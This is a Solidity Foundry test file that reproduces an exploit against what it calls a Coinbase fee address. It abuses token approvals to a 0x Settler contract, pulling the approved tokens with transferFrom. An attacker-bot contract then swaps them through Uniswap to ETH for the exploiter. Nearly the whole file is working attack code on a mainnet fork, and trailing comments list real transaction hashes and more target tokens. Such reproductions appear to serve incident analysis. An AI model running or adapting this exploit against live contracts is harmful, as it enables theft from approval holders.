// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function name() external view returns (string memory);
    function withdraw(uint256 wad) external;
    function approve(address spender, uint256 value) external returns (bool);
}

interface ISettlerActions {
    function BASIC(
        address sellToken,
        uint256 bps,
        address pool,
        uint256 offset,
        bytes calldata data
    ) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

struct AllowedSlippage {
    address payable recipient;
    IERC20 buyToken;
    uint256 minAmountOut;
}
interface Settler {
    function execute(
        AllowedSlippage calldata slippage,
        bytes[] calldata actions,
        bytes32 /* zid & affiliate */
    ) external payable returns (bool);
}

contract CoinbaseTest is Test {
    // Attacker -> Bot -> DEX -> Attacker
    // call execute to run transferFrom
    // and swap token to WETH to ETH through UniswapV2Router
    address victim_coinbaseFee = 0x382fFCe2287252F930E1C8DC9328dac5BF282bA1;
    address payable attacker_exploiter =
        payable(0x17F79E70ae89c6E32a9244d3d57B7AA648246468);
    address payable attacker_bot =
        payable(0xAC13439D598cD1A60c14C965ED0fa7C46Cb0D89d);

    address uniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address settler = 0xDf31A70a21A1931e02033dBBa7DEaCe6c45cfd0f;
    function setUp() public {
        // Orion Protocol: Old ORN Token 2
        vm.createSelectFork("eth", 23133532);

        vm.startPrank(attacker_exploiter);
        AttackerBot attackerBotInstance = new AttackerBot();
        attacker_bot = payable(address(attackerBotInstance)); // for PoC
    }

    function testExploit() public {
        vm.startPrank(attacker_exploiter);
        address targetToken = 0x0258F474786DdFd37ABCE6df6BBb1Dd5dfC4434a;

        console.log(
            "Before Victim Token balance:",
            IERC20(targetToken).balanceOf(victim_coinbaseFee)
        );
        console.log("Before Exploiter Balance:", attacker_exploiter.balance);
        checkBalanceAndExecute(targetToken);
        console.log("------------------------------------------");
        console.log(
            "After Victim Token balance:",
            IERC20(targetToken).balanceOf(victim_coinbaseFee)
        );
        console.log("After Exploiter Balance: ", attacker_exploiter.balance);

        vm.stopPrank();
    }
    function checkBalanceAndExecute(address token) public {
        // Check balance of victim_coinbaseFee
        uint256 balance = IERC20(token).balanceOf(victim_coinbaseFee);

        bytes[] memory payload = concatBytesArrays(
            buildAttackPayloadFromAttacker(token, balance),
            buildTokenToETHPayload(token)
        );
        AttackerBot(attacker_bot).attack(payload);

        // swap tokens to WETH and swap WETH to ETH
    }
    function concatBytesArrays(
        bytes[] memory a,
        bytes[] memory b
    ) internal pure returns (bytes[] memory) {
        bytes[] memory result = new bytes[](a.length + b.length);
        for (uint i = 0; i < a.length; i++) {
            result[i] = a[i];
        }
        for (uint j = 0; j < b.length; j++) {
            result[a.length + j] = b[j];
        }
        return result;
    }

    // made from off-chain
    function buildAttackPayloadFromAttacker(
        address token,
        uint256 amount
    ) public view returns (bytes[] memory attackPayload) {
        // 1. create transferFrom payload

        bytes memory transferFromPayload = abi.encodeWithSelector(
            IERC20(token).transferFrom.selector,
            victim_coinbaseFee,
            attacker_bot,
            amount
        );

        bytes memory basicData = abi.encode(
            IERC20(address(0)),
            uint256(10_000),
            token,
            uint256(0),
            transferFromPayload
        );

        bytes memory action = abi.encodePacked(
            ISettlerActions.BASIC.selector, // 0x38c9c147
            basicData
        );

        // 2. create actions array
        bytes[] memory actions = new bytes[](1);
        actions[0] = action;

        AllowedSlippage memory slip = AllowedSlippage({
            recipient: payable(address(0)),
            buyToken: IERC20(address(0)),
            minAmountOut: 0
        });

        // 3. create execute function callData
        bytes memory executeCallData = abi.encodeWithSelector(
            Settler.execute.selector,
            slip,
            actions,
            bytes32(0)
        );
        attackPayload = new bytes[](1);
        attackPayload[0] = abi.encode(settler, 0, executeCallData);
    }

    // made from off-chain
    function buildTokenToETHPayload(
        address token
    ) public view returns (bytes[] memory toETHPayload) {
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        toETHPayload = new bytes[](7);

        // 0. approve
        bytes memory approvePayload = abi.encodeWithSelector(
            IERC20(token).approve.selector,
            uniswapV2Router02,
            type(uint256).max
        );
        toETHPayload[0] = abi.encode(token, 0, approvePayload);

        // 1. check token balance
        bytes memory balanceOfPayload = abi.encodeWithSelector(
            IERC20(token).balanceOf.selector,
            attacker_bot
        );
        toETHPayload[1] = abi.encode(token, 36, balanceOfPayload);

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = WETH;

        // 2. create swapExactTokensForTokensSupportingFeeOnTransferTokens  payload for swapping to WETH
        bytes memory swapPayload = abi.encodeWithSelector(
            IUniswapV2Router02(uniswapV2Router02)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens
                .selector,
            0, // temp amountIn
            0, // amountOutMin
            path,
            address(attacker_bot),
            block.timestamp
        );
        toETHPayload[2] = abi.encode(uniswapV2Router02, 0, swapPayload);

        // 3. check WETH balance
        bytes memory balanceOfWETH = abi.encodeWithSelector(
            IERC20(WETH).balanceOf.selector,
            attacker_bot
        );
        toETHPayload[3] = abi.encode(WETH, 36, balanceOfWETH);
        // 4. WETH -> ETH
        bytes memory withdrawPayload = abi.encodeWithSelector(
            IERC20(WETH).withdraw.selector,
            0 // amount
        );
        toETHPayload[4] = abi.encode(WETH, 0, withdrawPayload);

        // 5. check balance
        bytes memory getBalancePayload = abi.encodeWithSelector(
            AttackerBot(attacker_bot).getBalance.selector
        );
        toETHPayload[5] = abi.encode(attacker_bot, 36, getBalancePayload);
        // 6. ETH send to exploiter
        bytes memory sendETHPayload = abi.encodeWithSelector(
            AttackerBot(attacker_bot).getBalance.selector,
            new bytes(0)
        );
        toETHPayload[6] = abi.encode(attacker_exploiter, 0, sendETHPayload);
    }
}

contract AttackerBot {
    address public owner;
    address uniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _;
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function attack(bytes[] memory executeCallData) external onlyOwner {
        uint256 paramBalance;
        uint256 paramOffset;

        for (uint i = 0; i < executeCallData.length; i++) {
            (address target, uint256 offset, bytes memory callData) = abi
                .decode(executeCallData[i], (address, uint, bytes));

            uint256 value = 0;
            if (target == owner) {
                (bool success, ) = target.call{value: paramBalance}("");
                continue;
            }
            if (paramOffset != 0) {
                // Replace the value at the offset position in calldata with paramBalance
                assembly {
                    mstore(add(callData, paramOffset), paramBalance)
                }
                paramBalance = 0;
                paramOffset = 0;
            }

            if (offset != 0) {
                (bool success, bytes memory returnData) = target.staticcall(
                    callData
                );
                require(success, "balanceOf call failed");
                paramBalance = abi.decode(returnData, (uint256));
                paramOffset = offset;
                continue; // Move to next loop
            }

            (bool success, ) = target.call{value: value}(callData);
            require(success, "attack failed");
        }
    }
    fallback() external payable {}
}

// First approve transaction: 0xc4c090334cb46ca327a6d833db3dc69ecbaf38ecb29ba53ae996951d828fabe8
// First block number: 23133529
// Last approve transaction: 0x4f724ef215e5975a1b3bf4b01af6bc8c37ddd8df2c763564b78369bb304c1b59
// Last block number: 23134155

// First token: 0x0000000000c5dc95539589fbD24BE07c6C14eCa4 / Milady Cult: CULT Token
// Second token: 0x0001A500A6B18995B03f44bb040A5fFc28E45CB0 / Autonolas: OLAS Token
// Third token: 0x0258F474786DdFd37ABCE6df6BBb1Dd5dfC4434a / Orion Protocol: Old ORN Token 2 // 0x61a3a59df09b86a1be8b1479288752aabca72673f7b12f4ade3f66d616a3987d
// Fourth token: 0x02e7F808990638E9e67E1f00313037EDe2362361 / KiboShib: KIBSHI Token
// Fifth token: 0x02f92800F57BCD74066F5709F1Daa1A4302Df875 / Peapods Finance: PEAS Token
// Sixth token: 0x0305f515fa978cf87226cf8A9776D25bcfb2Cc0B / Pepe 2.0: PEPE2.0 Token
// ...
